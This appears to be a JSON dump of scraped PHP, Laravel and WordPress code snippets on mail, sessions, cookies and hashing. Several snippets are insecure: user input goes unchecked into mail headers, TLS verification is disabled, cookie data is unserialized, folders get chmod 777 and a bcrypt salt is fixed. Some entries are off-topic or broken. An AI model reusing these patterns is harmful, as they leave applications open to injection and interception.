    "description": "<?php  if(isset($_POST['submit'])){     $to = \"email@example.com\"; // this is your Email address     $from = $_POST['email']; // this is the sender's Email address     $first_name = $_POST['first_name'];     $last_name = $_POST['last_name'];     $subject = \"Form submission\";     $subject2 = \"Copy of your form submission\";     $message = $first_name . \" \" . $last_name . \" wrote the following:\" . \"\\n\\n\" . $_POST['message'];     $message2 = \"Here is a copy of your message \" . $first_name . \"\\n\\n\" . $_POST['message'];      $headers = \"From:\" . $from;     $headers2 = \"From:\" . $to;     mail($to,$subject,$message,$headers);     mail($from,$subject2,$message2,$headers2); // sends a copy of the message to the sender     echo \"Mail Sent. Thank you \" . $first_name . \", we will contact you shortly.\";     // You can also use header('Location: thank_you.php'); to redirect to another page.     } ?>  <!DOCTYPE html> <head> <title>Form submission</title> </head> <body>  <form action=\"\" method=\"post\"> First Name: <input type=\"text\" name=\"first_name\"><br> Last Name: <input type=\"text\" name=\"last_name\"><br> Email: <input type=\"text\" name=\"email\"><br> Message:<br><textarea rows=\"5\" name=\"message\" cols=\"30\"></textarea><br> <input type=\"submit\" name=\"submit\" value=\"Submit\"> </form>  </body> </html> \n <!DOCTYPE html> <html> <head> <title>FeedBack Form With Email Functionality</title> <link href=\"css/elements.css\" rel=\"stylesheet\"> </head> <!-- Body Starts Here --> <body> <div class=\"container\"> <!-- Feedback Form Starts Here --> <div id=\"feedback\"> <!-- Heading Of The Form --> <div class=\"head\"> <h3>FeedBack Form</h3> <p>This is feedback form. Send us your feedback !</p> </div> <!-- Feedback Form --> <form action=\"#\" id=\"form\" method=\"post\" name=\"form\"> <input name=\"vname\" placeholder=\"Your Name\" type=\"text\" value=\"\"> <input name=\"vemail\" placeholder=\"Your Email\" type=\"text\" value=\"\"> <input name=\"sub\" placeholder=\"Subject\" type=\"text\" value=\"\"> <label>Your Suggestion/Feedback</label> <textarea name=\"msg\" placeholder=\"Type your text here...\"></textarea> <input id=\"send\" name=\"submit\" type=\"submit\" value=\"Send Feedback\"> </form> <h3><?php include \"secure_email_code.php\"?></h3> </div> <!-- Feedback Form Ends Here --> </div> </body> <!-- Body Ends Here --> </html> Copy\n",
    "reg_date": "2021-10-12T10:20:14.000Z"
  },
  {
    "id": 4692,
    "keyword": null,
    "link": null,
    "title": " send email with swiftmailer symfony",
    "description": "<?php //This is a class throw it in your symfony project  //and use it to send all your email  // easy money <3  namespace App\\CostomClass;  // fix your name space or create a folder named CostomClass in your src  use App\\Repository\\ParametreRepository; use Symfony\\Component\\DependencyInjection\\ContainerInterface;  Class SendMail{      function __construct( $Email , $Subject ,  $text )     {         $this->Email = $Email ;             //string         $this->Subject = $Subject ;         //string         $this->text = $text ;         //string     }       //SMTP         public function sendMessageWithSMTP()     {          $transport = (new \\Swift_SmtpTransport('smtp.office365.com', 25, 'tls'))             ->setUsername('youremail@yourhost.xx')             ->setPassword('YourPassword');         $transport->setLocalDomain('[127.0.0.1]');         $mailer = new \\Swift_Mailer($transport);          try {             $message = (new \\Swift_Message($this->Subject))                 ->setFrom(array('youremail@yourhost.xx' => \"Subject\"))                 ->setTo( $this->Email)                 //->setBcc($client)                 ->setBody($this->text, 'text/html');             $mailer->send($message);          } catch (\\Exception $e) {             return $e->getMessage();         }          return 1;      }  // Gmail       public function sendMessageWithGmail()     {          $transport = (new \\Swift_SmtpTransport('smtp.gmail.com', 465, 'ssl'))             ->setUsername('mail@gmail.com')             ->setPassword('Password');         $transport->setLocalDomain('[127.0.0.1]'); // don't really need it         $mailer = new \\Swift_Mailer($transport);          try {             $message = (new \\Swift_Message($this->Subject))                 ->setFrom(array('mail@gmail.com' => \"Subject\"))                 ->setTo( $this->Email)                 //->setBcc($client)                 ->setBody($this->text, 'text/html');             $mailer->send($message);          } catch (\\Exception $e) {             return $e->getMessage();         }          return 1;      }    // how to use anywhere in your project: // in any controller  // $sendMail = new SendMail(\"youremail@gmail.com\",\"test\",\"hello world\"); // $result = $sendMail->sendMessageWithSMTP( $mailer); // or // $result = $sendMail->sendMessageWithGmail( $mailer); // dump($result);die(); 1 for the win and erreur mesage if something went wrong   }\n",
    "reg_date": "2021-10-12T10:20:14.000Z"
  },
  {
    "id": 4693,
    "keyword": null,
    "link": null,
    "title": " send html email laravel",
    "description": "// $data => array of information passed to view Mail::send('email_view', $data, function ($m) use ($user) {                 $m->from(\"example@gmail.com\", config('app.name', 'APP Name'));                 $m->to($user->email, $user->email)->subject('Email Subject!');             });\n",
    "reg_date": "2021-10-12T10:20:14.000Z"
  },
  {
    "id": 4694,
    "keyword": null,
    "link": null,
    "title": " send mail infinityfree phpmailer",
    "description": "$mail->SMTPOptions = array(         'ssl' => array(             'verify_peer' => false,             'verify_peer_name' => false,             'allow_self_signed' => true         )     );\n",
    "reg_date": "2021-10-12T10:20:14.000Z"
  },
  {
    "id": 4695,
    "keyword": null,
    "link": null,
    "title": " send multiple mail in laravel",
    "description": "$emails = ['myoneemail@esomething.com', 'myother@esomething.com','myother2@esomething.com'];  Mail::send('emails.welcome', [], function($message) use ($emails) {         $message->to($emails)->subject('This is test e-mail');     }); var_dump( Mail:: failures()); exit; \n",
    "reg_date": "2021-10-12T10:20:14.000Z"
  },
  {
    "id": 4696,
    "keyword": null,
    "link": null,
    "title": " send value from one page to another in php",
    "description": "//On page 1 $_SESSION['varname'] = $var_value;  //On page 2 $var_value = $_SESSION['varname'];\n",
    "reg_date": "2021-10-12T10:20:14.000Z"
  },
  {
    "id": 4697,
    "keyword": null,
    "link": null,
    "title": " send variable to get template part",
    "description": "//NEW CLEAN way (WP 5.5.0 >=) of passing variables to template parts   $data = array('foo'=>'bar');  //add your variables as a third parameter get_template_part( 'template-parts/file', 'name', $data );  //In the template part itself: (IMPORTANT NOTE: the name of the variable has to be args) echo $args['foo'];\n<?php get_header();  // etc.  // In the main template file $users = new \\WP_User_Query( [ ... ] );  foreach ( $users as $user ) {     set_query_var( 'user_id', absint( $user->ID ) );     get_template_part( 'template-parts/user', 'contact_methods' ); }\n",
    "reg_date": "2021-10-12T10:20:14.000Z"
  },
  {
    "id": 4698,
    "keyword": null,
    "link": null,
    "title": " separate date from datetime php",
    "description": "$time = new DateTime(\"2011-08-04 15:00:01\"); $date = $time->format('n.j.Y'); $time = $time->format('H:i');\ndate('Y-m-d', strtotime( '2015-04-16 15:00:01' ) );\n",
    "reg_date": "2021-10-12T10:20:15.000Z"
  },
  {
    "id": 4699,
    "keyword": null,
    "link": null,
    "title": " separate numbers with commas laravel",
    "description": "number_format($number)\n",
    "reg_date": "2021-10-12T10:20:15.000Z"
  },
  {
    "id": 4700,
    "keyword": null,
    "link": null,
    "title": " serve php file",
    "description": "cd path/to/your/app php -S localhost:8000\nOpen Terminal php -S localhost:8000\n// to serve folder foo in public $ cd ~/public $ php -S localhost:8000 -t foo/\n",
    "reg_date": "2021-10-12T10:20:15.000Z"
  },
  {
    "id": 4701,
    "keyword": null,
    "link": null,
    "title": " server cmd php",
    "description": "php -S localhost:8000\n",
    "reg_date": "2021-10-12T10:20:15.000Z"
  },
  {
    "id": 4702,
    "keyword": null,
    "link": null,
    "title": " session cakephp",
    "description": "CakeSession::read('Administrator') = $this->Session->read('Administrator.current');\n",
    "reg_date": "2021-10-12T10:20:15.000Z"
  },
  {
    "id": 4703,
    "keyword": null,
    "link": null,
    "title": " session destroy not working",
    "description": "//After using session_destroy(), the session is destroyed behind the scenes. For some reason this doesn't affect the values in $_SESSION, which was already populated for this request, but it will be empty in future requests.  //You can manually clear $_SESSION if you so desire ($_SESSION = [];).  <?php  $_SESSION = [];  session_unset();  session_destroy(); ?>\n",
    "reg_date": "2021-10-12T10:20:15.000Z"
  },
  {
    "id": 4704,
    "keyword": null,
    "link": null,
    "title": " session flush laravel",
    "description": "// Forget a single key... $request->session()->forget('name'); // Forget multiple keys... $request->session()->forget(['name', 'status']);  $request->session()->flush();\n# ref: https://laravel.io/forum/02-06-2014-session-destroy  Session::forget('yourKeyGoesHere') // Removes a specific variable \n$request->session()->put('key','value'); \n",
    "reg_date": "2021-10-12T10:20:15.000Z"
  },
  {
    "id": 4705,
    "keyword": null,
    "link": null,
    "title": " session has laravel blade",
    "description": "{{ session()->get('name') }}\n@if(session()->has('qwick'))     @else      @endif\n@if(Session::has('error')) <div class=\"alert alert-danger\">   {{ Session::get('error')}} </div> @endif \n",
    "reg_date": "2021-10-12T10:20:15.000Z"
  },
  {
    "id": 4706,
    "keyword": null,
    "link": null,
    "title": " session initialize php",
    "description": "session_start(); \n",
    "reg_date": "2021-10-12T10:20:15.000Z"
  },
  {
    "id": 4707,
    "keyword": null,
    "link": null,
    "title": " session laravel",
    "description": "/**   * Static method  */ Session::put('key', $value);\t// Set session variable Session::get('key')\t\t\t\t// Get session variable  /**  * Instance method  */ session(['key' => $value]);\t\t// Set session variable session('key');\t\t\t\t\t// Get session variable\nuse Illuminate\\Support\\Facades\\Session;  Session::flash('message','This is a message!');   then in your view::  @if(Session::has('message'))  <p class=\"alert {{ Session::get('alert-class', 'alert-info') }}\">{{Session::get('message') }}</p>  @endif\nSession::put('key', 'value');  session(['key' => 'value']);\n$data = $request->session()->all();\nSession::put('variableName', $value);\nsession(['name' => 'data']);\n",
    "reg_date": "2021-10-12T10:20:15.000Z"
  },
  {
    "id": 4708,
    "keyword": null,
    "link": null,
    "title": " session start(): cannot start session when headers already sent",
    "description": "// FIRST line of each php file using session (no character before) <?php if ( empty(session_id()) ) session_start(); ?> // Encode in ANSI or UTF8 (No BOM !)\n",
    "reg_date": "2021-10-12T10:20:16.000Z"
  },
  {
    "id": 4709,
    "keyword": null,
    "link": null,
    "title": " session variable in laravel",
    "description": "/**   * Static method  */ Session::put('key', $value);\t// Set session variable Session::get('key')\t\t\t\t// Get session variable  /**  * Instance method  */ session(['key' => $value]);\t\t// Set session variable session('key');\t\t\t\t\t// Get session variable\nSession::put('variableName', $value);\n$request->session()->put('key','value'); \nsession()->regenerate();\n",
    "reg_date": "2021-10-12T10:20:16.000Z"
  },
  {
    "id": 4710,
    "keyword": null,
    "link": null,
    "title": " set array in javascript from php",
    "description": "//set array in javascript from php array var jsarry =  <?php echo '[\"' . implode('\", \"', $phparry) . '\"]' ?>;\n",
    "reg_date": "2021-10-12T10:20:16.000Z"
  },
  {
    "id": 4711,
    "keyword": null,
    "link": null,
    "title": " set character set utf8 in pdo php",
    "description": "\"mysql:host=$host;dbname=$db;charset=utf8\" \n",
    "reg_date": "2021-10-12T10:20:16.000Z"
  },
  {
    "id": 4712,
    "keyword": null,
    "link": null,
    "title": " set charset of response php",
    "description": "header('Content-Type: text/html; charset=utf-8');\n",
    "reg_date": "2021-10-12T10:20:16.000Z"
  },
  {
    "id": 4713,
    "keyword": null,
    "link": null,
    "title": " set cookies function in php",
    "description": "setcookie($cookiename, $cookievalue, time() + (86400 * 30), \"/\"); // 86400 = 1 day\n//Cookies //Cookies are stored on the client side. cookies are not as secure as sessions //and it is recommended that you use sessions as much as possible. ==================== Version 1 for cookies ====================  <?php if(isset($_COOKIE['nameofcookie'])){      echo 'User ' . $_COOKIE['nameofcookie'] . ' is set<br>'; }else{     echo'User is not set'; }   ==================== Version 2 for cookies ==================== <?php     //to change cookie     setcookie('nameofcookie','Frank', time() + (86400 *30));//set for a day  if(isset($_COOKIE['nameofcookie'])){      echo 'User ' . $_COOKIE['nameofcookie'] . ' is set<br>'; }else{     echo'User is not set'; }  ======================= Version 3 for cookies =======================  <?php     //to change cookie     setcookie('nameofcookie','Frank', time() + (86400 *30));//set for a day     //to unset a cookie just set the time that is already past     //delete cookie     setcookie('nameofcookie','Frank', time() -3600);  if(isset($_COOKIE['nameofcookie'])){      echo 'User ' . $_COOKIE['nameofcookie'] . ' is set<br>'; }else{     echo'User is not set'; }  ========================= Version 4 check for cookies ========================= <?php     //to change cookie     setcookie('nameofcookie','Frank', time() + (86400 *30));//set for a day      if(count($_COOKIE) > 0){         echo 'There are ' . count($_COOKIE)  .  ' cookies saved<br>';         }else{             echo 'There are no cookies saved<br>';         }  if(isset($_COOKIE['nameofcookie'])){      echo 'User ' . $_COOKIE['nameofcookie'] . ' is set<br>'; }else{     echo'User is not set'; } \n//Parameter of Cookie  //only first line is usable other lines is for descrption setcookie($cookiename ,$cookievalue , time() + (86400 * 10) , \"/\" , domain.com ,True , False);   //Explanation setcookie(name , value, time, path, domain , secure, httponly)   1.name is the name of cookie   2.value is the value that you want to save in cookie   3.time is expire time of cookie and it is set in sec so 86400 sec is   equal to 1 day time() function get the current time and 86400 * 10 means   after 10 days cookie will be expire   4.path is path of  website to access coookie if we use \"/\" it means we can      access cookie from every page   5.domain is the domain from which you want to access the cookie if we use      domain then we only access cookie from that specific domain   6.secure means HTTPs protocol if its True it means cookie only set if its      HTTPs otherwise cookie cannot set   7.HTTPonly means if its false we can access cookie from localsite(javascript)     and serversite but if its Ture other wise from only serversite (php)\n<?php   $name = 'COOKIE_NAME';   $value = 'VALUE';   $expireTime = strtotime('+1 years');   $path = '/';   setcookie($name,$value,$expireTime,$path); \n//Cookies //Cookies are stored on the client side. cookies are not as secure as sessions //and it is recommended that you use sessions as much as possible. //save addional information as an array in a cookie <?php     $user = ['name' => 'Brad', 'email' => 'test@test.com', 'age' = 35];      $user = serialize($user);      setcookie('user', $user, time() + (86400 *30));          $user = unserialize($_COOKIE['user']);      echo $user['name'];\nsetcookie(\"cookie_name\", \"type_on_cookie\", expiry_time(), \"/\");\n",
    "reg_date": "2021-10-12T10:20:16.000Z"
  },
  {
    "id": 4714,
    "keyword": null,
    "link": null,
    "title": " set nav link active on the basis of route laravel",
    "description": "{{  request()->routeIs('news.*') ? 'active' : '' }}\n<li class=\"{{ (request()->is('admin/cities*')) ? 'active' : '' }}\">  \n",
    "reg_date": "2021-10-12T10:20:16.000Z"
  },
  {
    "id": 4715,
    "keyword": null,
    "link": null,
    "title": " set nav link active on the basis of route laravel 8",
    "description": "{{  request()->routeIs('news.*') ? 'active' : '' }}\n<li class=\"{{ (request()->is('admin/cities*')) ? 'active' : '' }}\">  \n",
    "reg_date": "2021-10-12T10:20:16.000Z"
  },
  {
    "id": 4716,
    "keyword": null,
    "link": null,
    "title": " set null on foreign key deletion in laravel",
    "description": "$table->foreignId('forign_id')->nullable()->constrained(\"table_name\")->cascadeOnUpdate()->nullOnDelete(); \n",
    "reg_date": "2021-10-12T10:20:16.000Z"
  },
  {
    "id": 4717,
    "keyword": null,
    "link": null,
    "title": " set php var to html",
    "description": "<?php ob_start();?> <div>Contents goes <b>here</b></div> <?php $contents=ob_get_clean();?> \n<?php     //can also use print instead of echo and would return  but it is     //slower so use echo mainly     #variable rules     /*         - Prefix with a dollar sign $         - Start with a letter or an underscore only         - Only letters, numbers and underscores         - Case sensative     */      #DATA TYPES     /*         Strings         Integers 4         floats 4.4         Booleans True or Flase         Arrays         Objects         Null         Resources      */     $output = '  Hello there Bob!!';     $num1 = 4;     $num2 =10;     $sum = $num1 + $num2;     $string1 = '  Hello';     $string2 = 'Bobby!!';     $greeting = $string1 .' '. $string2;     $greeting2 = \"$string1 $string2\";      $string3 = ' They\\'re Here';      #making a constant      define('GREETING', ' Hello Everyone!!');      echo $sum;     echo $output;     echo $greeting;     echo $greeting2;     echo $string3;     echo GREETING; ?>\n$varName = \"Hello, World\";\n",
    "reg_date": "2021-10-12T10:20:16.000Z"
  },
  {
    "id": 4718,
    "keyword": null,
    "link": null,
    "title": " set php varibianle session",
    "description": "<?php    // Start the session   session_start(); ?> <!DOCTYPE html> <html>   <body>   <?php     // Set session variables     $_SESSION[\"color\"]= \"blue\";     $_SESSION[\"animal\"]= \"dog\";     echo \"The session variable are set up.\";   ?>   </body> </html>\n",
    "reg_date": "2021-10-12T10:20:17.000Z"
  },
  {
    "id": 4719,
    "keyword": null,
    "link": null,
    "title": " set postman global variable header",
    "description": "// set postman global variable in header pm.request.headers.add({key: 'CustomHeader', value: 'CustomValue' });  pm.request.headers.add({key: 'Content-Type', value: 'application/json' });\n var data = JSON.parse(responseBody); postman.clearGlobalVariable(\"jwt_token\"); postman.setGlobalVariable(\"jwt_token\", data.jwt_token); \n",
    "reg_date": "2021-10-12T10:20:17.000Z"
  },
  {
    "id": 4720,
    "keyword": null,
    "link": null,
    "title": " set session after login with laravel",
    "description": "    $user = Auth::User();     Session::put('user', $user);     $user=Session::get('user');     return $user->name;  \n",
    "reg_date": "2021-10-12T10:20:17.000Z"
  },
  {
    "id": 4721,
    "keyword": null,
    "link": null,
    "title": " set session data in laravel",
    "description": "/**   * Static method  */ Session::put('key', $value);\t// Set session variable Session::get('key')\t\t\t\t// Get session variable  /**  * Instance method  */ session(['key' => $value]);\t\t// Set session variable session('key');\t\t\t\t\t// Get session variable\nSession::put('key', 'value');  session(['key' => 'value']);\nSession::put('variableName', $value);\n$request->session()->put('key','value'); \n<!--This is placed in the view section --> {{ session('key_name') }}\n$value = Session::get('key');  $value = session('key');\n",
    "reg_date": "2021-10-12T10:20:17.000Z"
  },
  {
    "id": 4722,
    "keyword": null,
    "link": null,
    "title": " set session in laravel",
    "description": "/**   * Static method  */ Session::put('key', $value);\t// Set session variable Session::get('key')\t\t\t\t// Get session variable  /**  * Instance method  */ session(['key' => $value]);\t\t// Set session variable session('key');\t\t\t\t\t// Get session variable\nSession::put('key', 'value');  session(['key' => 'value']);\nSession::put('variableName', $value);\n$request->session()->put('key','value'); \nSession::get('variableName');\nsession(['variableName' => $value]);\n",
    "reg_date": "2021-10-12T10:20:17.000Z"
  },
  {
    "id": 4723,
    "keyword": null,
    "link": null,
    "title": " set subject for mail inlaravel",
    "description": " return (new MailMessage)                 ->subject('your seubject')                 ->greeting('Hello')                 ->line('intro line.')                 ->action('action url', url(''))                 ->line('Thank you for using our application!');\n",
    "reg_date": "2021-10-12T10:20:17.000Z"
  },
  {
    "id": 4724,
    "keyword": null,
    "link": null,
    "title": " set unique value validation for laravel form request",
    "description": "use Illuminate\\Validation\\Rule;  public function rules() {     return [ \t    'title' => [ \t\t    'required', \t\t    Rule::unique('posts', 'title')->ignore($this->post) \t    ]     ];  } \nunique:table,column,except,idColumn  ############## Example : ################  ############### For Updating   //rules 'email' => 'unique:users,email_address,' . $userId,  ############### For Creating  //rules 'email' => 'unique:users,email_address',\n",
    "reg_date": "2021-10-12T10:20:17.000Z"
  },
  {
    "id": 4725,
    "keyword": null,
    "link": null,
    "title": " setcookie in laravel 8",
    "description": "Cookie::queue(Cookie::make('name', 'value', $minutes));  Cookie::queue('name', 'value', $minutes);\n",
    "reg_date": "2021-10-12T10:20:17.000Z"
  },
  {
    "id": 4726,
    "keyword": null,
    "link": null,
    "title": " setcookie php",
    "description": "setcookie($cookiename, $cookievalue, time() + (86400 * 30), \"/\"); // 86400 = 1 day\n//Parameter of Cookie  //only first line is usable other lines is for descrption setcookie($cookiename ,$cookievalue , time() + (86400 * 10) , \"/\" , domain.com ,True , False);   //Explanation setcookie(name , value, time, path, domain , secure, httponly)   1.name is the name of cookie   2.value is the value that you want to save in cookie   3.time is expire time of cookie and it is set in sec so 86400 sec is   equal to 1 day time() function get the current time and 86400 * 10 means   after 10 days cookie will be expire   4.path is path of  website to access coookie if we use \"/\" it means we can      access cookie from every page   5.domain is the domain from which you want to access the cookie if we use      domain then we only access cookie from that specific domain   6.secure means HTTPs protocol if its True it means cookie only set if its      HTTPs otherwise cookie cannot set   7.HTTPonly means if its false we can access cookie from localsite(javascript)     and serversite but if its Ture other wise from only serversite (php)\n<?php   $name = 'COOKIE_NAME';   $value = 'VALUE';   $expireTime = strtotime('+1 years');   $path = '/';   setcookie($name,$value,$expireTime,$path); \nsetcookie(\"cookie_name\", \"type_on_cookie\", expiry_time(), \"/\");\n//setcookie(name, value, expire, path, domain, security); //understand first line and then implement the second one setcookie($name, $value, 5, \"/\");\n",
    "reg_date": "2021-10-12T10:20:17.000Z"
  },
  {
    "id": 4727,
    "keyword": null,
    "link": null,
    "title": " setinterval php",
    "description": "setInterval(function(){        echo \"hi!\\n\"; }, 1000);\nfunction setInterval($f, $milliseconds) {        $seconds=(int)$milliseconds/1000;        while(true)        {            $f();            sleep($seconds);        } }\n",
    "reg_date": "2021-10-12T10:20:18.000Z"
  },
  {
    "id": 4728,
    "keyword": null,
    "link": null,
    "title": " setup cakephp",
    "description": "1. Add .htaccess <IfModule mod_rewrite.c> \tRewriteEngine on \tRewriteRule ^$ webroot/ [L] \tRewriteRule (.*) webroot/$1 [L] </IfModule>  2. Add Permission tmp, Vendor, Webroot - Window Set permisson - Linux Set chmod -R 777\n",
    "reg_date": "2021-10-12T10:20:18.000Z"
  },
  {
    "id": 4729,
    "keyword": null,
    "link": null,
    "title": " setup postdata not working",
    "description": "global $post; //important $posts = get_posts($args);   foreach($posts as $post) { //should be $post not $p etc     setup_postdata($post);     the_title();   }   wp_reset_postdata();\n",
    "reg_date": "2021-10-12T10:20:18.000Z"
  },
  {
    "id": 4730,
    "keyword": null,
    "link": null,
    "title": " sha256 encryption in php",
    "description": "echo hash('sha256', $_POST['ppasscode']);\n$hash = hash('sha256', 'hello, world!'); var_dump($hash); \necho hash('sha256', 'some string');\nCould this be a typo? (two Ps in ppasscode, intended?)  $_POST['ppasscode']; I would make sure and do:  print_r($_POST); and make sure the data is accurate there, and then echo out what it should look like:  echo hash('sha256', $_POST['ppasscode']); Compare this output to what you have in the database (manually). By doing this you're exploring your possible points of failure:  Getting password from form hashing the password stored password comparison of the two.\n",
    "reg_date": "2021-10-12T10:20:18.000Z"
  },
  {
    "id": 4731,
    "keyword": null,
    "link": null,
    "title": " sha256 in php",
    "description": "echo hash('sha256', $_POST['ppasscode']);\n$hash = hash('sha256', 'hello, world!'); var_dump($hash); \n$password = 'test123';  /* \tAlways use salt for security reasons.     I'm using the BCRYPT algorithm use any valid one you like. */ $options['salt'] = 'usesomesillystringforsalt'; $options['cost'] = 3; echo password_hash($password, PASSWORD_BCRYPT, $options)\n <?php echo hash('ripemd160', 'The quick brown fox jumped over the lazy dog.'); ?>  \nCould this be a typo? (two Ps in ppasscode, intended?)  $_POST['ppasscode']; I would make sure and do:  print_r($_POST); and make sure the data is accurate there, and then echo out what it should look like:  echo hash('sha256', $_POST['ppasscode']); Compare this output to what you have in the database (manually). By doing this you're exploring your possible points of failure:  Getting password from form hashing the password stored password comparison of the two.\nhash($hashingMethod, $dataToBeHashed, $BinaryOutputMode = false)    some hashingMethod options:  md5 sha1 sha256 sha384 sha512\n",
    "reg_date": "2021-10-12T10:20:18.000Z"
  },
  {
    "id": 4732,
    "keyword": null,
    "link": null,
    "title": " sha256 php",
    "description": "echo hash('sha256', $_POST['ppasscode']);\n$hash = hash('sha256', 'hello, world!'); var_dump($hash); \necho hash('sha256', 'some string');\n",
    "reg_date": "2021-10-12T10:20:18.000Z"
  },
  {
    "id": 4733,
    "keyword": null,
    "link": null,
    "title": " shop page url woocommerce",
    "description": "// Shop Page URL $shop_page_url = get_permalink( woocommerce_get_page_id( 'shop' ) );\n// MyAccount Page URL $myaccount_page_id = get_option( 'woocommerce_myaccount_page_id' ); if ( $myaccount_page_id ) {   $myaccount_page_url = get_permalink( $myaccount_page_id ); } \n",
    "reg_date": "2021-10-12T10:20:18.000Z"
  },
  {
    "id": 4734,
    "keyword": null,
    "link": null,
    "title": " short-open tags in php",
    "description": "<?=\"Hello world\";?> <?=\"Hello world\"?>\n<?= //do stuff here; ?>\n",
    "reg_date": "2021-10-12T10:20:19.000Z"
  },
  {
    "id": 4735,
    "keyword": null,
    "link": null,
    "title": " short hand of if else in php",
    "description": "$errors = array(             0 => 'OK',             1 => 'Неверный xml',             2 => 'Широта не указана',             3 => 'Долгота не указана',             4 => 'Дата и время запроса не указаны',             5 => 'Точность не указана',             6 => 'Идентификатор телефона не указан',             7 => 'Идентификатор телефона не найден',             8 => 'Неверная широта',             9 => 'Неверная долгота',             10 => 'Неверная точность',             11 => 'Заказы не найдены',             12 => 'Неверные дата и время запроса',             13 => 'Ошибка mysql',             14 => 'Неизвестная функция',             15 => 'Тариф не найден',             18 => 'Город отправления не указан',             19 => 'Город назначения не указан',             20 => 'Неверная масса',             21 => 'Город отправления не найден',             22 => 'Город назначения не найден',             23 => 'Масса не указана',             24 => 'Логин не указан',             25 => 'Ошибка авторизации',             26 => 'Логин уже существует',             27 => 'Клиент уже существует',             28 => 'Адрес не указан',             29 => 'Более не поддерживается',             30 => 'Настройка sip не выполнена',             31 => 'Телефон не указан',             32 => 'Телефон курьера не указан',             33 => 'Ошибка соединения',             34 => 'Неверный номер',             35 => 'Неверный номер',             36 => 'Ошибка определения тарифа',             37 => 'Ошибка определения тарифа',             38 => 'Тариф не найден',             39 => 'Тариф не найден',         );          return isset($errors[$code]) ? $errors[$code] : 'Неизвестная ошибка';\n$is_admin = ($user['permissions'] == 'admin') ? true : false;\n",
    "reg_date": "2021-10-12T10:20:19.000Z"
  },
  {
    "id": 4736,
    "keyword": null,
    "link": null,
    "title": " shortcode php wordpress",
    "description": "function create_shortcode(){     return \"<h2>Hello world !</h2>\"; } add_shortcode('my_shortcode', 'create_shortcode'); // Use [my_shortcode]\n<?php echo do_shortcode('[name_of_shortcode parameters=\"\"]'); ?>\nfunction wp_demo_shortcode() {   //Turn on output buffering ob_start(); $code = 'Hello World'; ob_get_clean();   // Output needs to be return return $code; }   // register shortcode add_shortcode('helloworld', 'wp_demo_shortcode'); \n// function that runs when shortcode is called function wpb_demo_shortcode() {    // Things that you want to do.  $message = 'Hello world!';    // Output needs to be return return $message; }  // register shortcode add_shortcode('greeting', 'wpb_demo_shortcode');  \nreturn do_shortcode($content);\nThe pairs should be considered to be all of the attributes which are supported by the caller and given as a list. The returned attributes will only contain the attributes in the $pairs list.  If the $atts list has unsupported attributes, then they will be ignored and removed from the final returned list.  <?php  function shortcode_atts( $pairs, $atts, $shortcode = '' ) {     $atts = (array) $atts;     $out  = array();     foreach ( $pairs as $name => $default ) {         if ( array_key_exists( $name, $atts ) ) {             $out[ $name ] = $atts[ $name ];         } else {             $out[ $name ] = $default;         }     }       if ( $shortcode ) {         /**          * Filters shortcode attributes.          *          * If the third parameter of the shortcode_atts() function is present then this filter is available.          * The third parameter, $shortcode, is the name of the shortcode.          *          * @since 3.6.0          * @since 4.4.0 Added the `$shortcode` parameter.          *          * @param array  $out       The output array of shortcode attributes.          * @param array  $pairs     The supported attributes and their defaults.          * @param array  $atts      The user defined shortcode attributes.          * @param string $shortcode The shortcode name.          */         $out = apply_filters( \"shortcode_atts_{$shortcode}\", $out, $pairs, $atts, $shortcode );     }       return $out; }  ?> \n",
    "reg_date": "2021-10-12T10:20:19.000Z"
  },
  {
    "id": 4737,
    "keyword": null,
    "link": null,
    "title": " shorthand if php",
    "description": "<?php $v = 1;  $r = (1 == $v) ? 'Yes' : 'No'; // $r is set to 'Yes' $r = (3 == $v) ? 'Yes' : 'No'; // $r is set to 'No'  echo (1 == $v) ? 'Yes' : 'No'; // 'Yes' will be printed  // and since PHP 5.3 $v = 'My Value'; $r = ($v) ?: 'No Value'; // $r is set to 'My Value' because $v is evaluated to TRUE  $v = ''; echo ($v) ?: 'No Value'; // 'No Value' will be printed because $v is evaluated to FALSE ?> \n$is_admin = ($user['permissions'] == 'admin') ? true : false;\n<?php echo ($qte > 0) ? $qte : 0; ?>\n",
    "reg_date": "2021-10-12T10:20:19.000Z"
  },
  {
    "id": 4738,
    "keyword": null,
    "link": null,
    "title": " shoulder blade technical name",
    "description": "google is the site to cheat your home learning on\n",
    "reg_date": "2021-10-12T10:20:19.000Z"
  },
  {
    "id": 4739,
    "keyword": null,
    "link": null,
    "title": " show 500 or 404 page in laravel",
    "description": "public function render($request, Exception $e) {      // 404 page when a model is not found     if ($e instanceof ModelNotFoundException) {         return response()->view('errors.404', [], 404);     }      if ($this->isHttpException($e)) {         return $this->renderHttpException($e);     } else {         // Custom error 500 view on production         if (app()->environment() == 'production') {             return response()->view('errors.500', [], 500);         }         return parent::render($request, $e);     }  } \n",
    "reg_date": "2021-10-12T10:20:19.000Z"
  },
  {
    "id": 4740,
    "keyword": null,
    "link": null,
    "title": " show alert in php",
    "description": "echo '<script>alert(\"Message\")</script>';\necho '<script language=\"javascript\">alert(\"juas\");</script>';\n",
    "reg_date": "2021-10-12T10:20:19.000Z"
  },
  {
    "id": 4741,
    "keyword": null,
    "link": null,
    "title": " show all terms of a custom taxonomy",
    "description": "$terms = get_terms( array(   'taxonomy' => 'taxonomy_name_or_slug',   'hide_empty' => true, ) ); foreach ($terms as $term){   echo $term->slug;   echo $term->name;   echo \"<br><br>\"; }\n",
    "reg_date": "2021-10-12T10:20:19.000Z"
  },
  {
    "id": 4742,
    "keyword": null,
    "link": null,
    "title": " show all validation errors in laravel's blade view",
    "description": "@if($errors->any())     <div class=\"alert alert-danger\">         <p><strong>Opps Something went wrong</strong></p>         <ul>         @foreach ($errors->all() as $error)             <li>{{ $error }}</li>         @endforeach         </ul>     </div> @endif  @if(session('success'))     <div class=\"alert alert-success\">{{session('success')}}</div> @endif  @if(session('error'))     <div class=\"alert alert-danger\">{{session('error')}}</div> @endif \n@if($errors->any())     {!! implode('', $errors->all('<span class=\"text text-danger\">:message</span>')) !!} @endif\n@if($errors->has())    @foreach ($errors->all() as $error)       <div>{{ $error }}</div>   @endforeach @endif\n<!-- /resources/views/post/create.blade.php -->  <h1>Create Post</h1>  @if ($errors->any())     <div class=\"alert alert-danger\">         <ul>             @foreach ($errors->all() as $error)                 <li>{{ $error }}</li>             @endforeach         </ul>     </div> @endif  <!-- Create Post Form -->\n",
    "reg_date": "2021-10-12T10:20:19.000Z"
  },
  {
    "id": 4743,
    "keyword": null,
    "link": null,
    "title": " show date time with milliseconds php",
